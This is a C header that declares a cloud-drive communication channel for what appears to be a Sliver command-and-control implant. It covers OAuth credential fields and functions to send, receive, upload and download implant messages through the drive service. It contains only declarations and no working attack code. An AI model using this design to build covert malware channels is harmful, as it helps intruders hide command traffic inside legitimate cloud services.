#pragma once

typedef struct _DRIVE_CONFIG {
	LPSTR lpClientId;
	LPSTR lpClientSecret;
	LPSTR lpRefreshToken;
} DRIVE_CONFIG, * PDRIVE_CONFIG;

struct _SLIVER_DRIVE_CLIENT {
	PHTTP_CONFIG pHttpConfig;
	PDRIVE_CONFIG* DriveList;
	DWORD dwNumberOfDriveConfigs;
	LPSTR lpSendPrefix;
	LPSTR lpRecvPrefix;
};

PSLIVER_DRIVE_CLIENT DriveInit();

BOOL DriveStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
);

BOOL DriveSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PENVELOPE pEnvelope
);

PENVELOPE DriveRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
);

BOOL DriveClose
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
);

BOOL RefreshAccessToken
(
	PSLIVER_DRIVE_CLIENT pDriveClient,
	PDRIVE_CONFIG pDriveConfig
);

BOOL DriveUpload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PBYTE pData,
	_In_ DWORD cbData,
	_In_ LPSTR lpName
);

BOOL GetFileId
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR lpPattern,
	_Out_ LPSTR* pId
);

PBUFFER DriveDownload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR lpFileId
);

BOOL FreeDriveClient
(
	_In_ PSLIVER_DRIVE_CLIENT pBeaconClient
);